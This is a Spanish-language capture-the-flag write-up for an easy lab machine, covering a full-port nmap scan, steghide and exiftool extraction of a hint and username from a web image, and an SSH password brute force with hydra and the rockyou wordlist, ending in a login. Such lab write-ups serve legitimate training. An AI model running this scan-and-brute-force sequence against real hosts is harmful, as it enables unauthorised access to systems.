
**Autor:** [BorazuwarahCTF

**Dificultad:** Muy Fácil

**Fecha de creación:** 28/05/2024


DESPLIEGUE

```
bash auto_deploy.sh borazuwarahctf.tar
```


![Img](./images/Pasted%20image%2020241106191136.png)






------------------------
PROCEDIMIENTO:

Tenemos la IP: 
```
172.17.0.2
```



---------------------------

RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

`-p-` ⮞ aplicar reconocimiento a todos los puertos  
`--open` ⮞ solo a los que estén abiertos  
`--min-rate 5000` ⮞ para enviar paquetes más rápido  
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida  
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla  
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)  
`-Pn` ⮞ ignora si esta activa o no la IP  
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)


![Img](./images/Pasted%20image%2020240917192325.png)


Nos vamos a la página web y nos sale :

![Img](./images/Pasted%20image%2020240917193213.png)

Nos descargamos la imagen y veremos si tiene algún archivo oculto. Haremos el siguiente comando:

```
steghide extract -sf imagen.jpeg
```

![Img](./images/Pasted%20image%2020240917193813.png)


```
cat secreto.txt
```

![Img](./images/Pasted%20image%2020240917193842.png)


Lo cual nos da una pista. Buscaremos  más información dentro de esta imagen como son los metadatos , usaremos `exiftool`, por lo cual usando el comando 

```
exiftool imagen.jpeg
```
![Img](./images/Pasted%20image%2020240917194039.png)

Y ahí tenemos un usuario `borazuwarah`

Ahora fuerza bruta. 

```
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![Img](./images/Pasted%20image%2020240917194231.png)

```
ssh borazuwarah@172.17.0.2
```
![Img](./images/Pasted%20image%2020240917194342.png)


Y ya estamos adentro. 
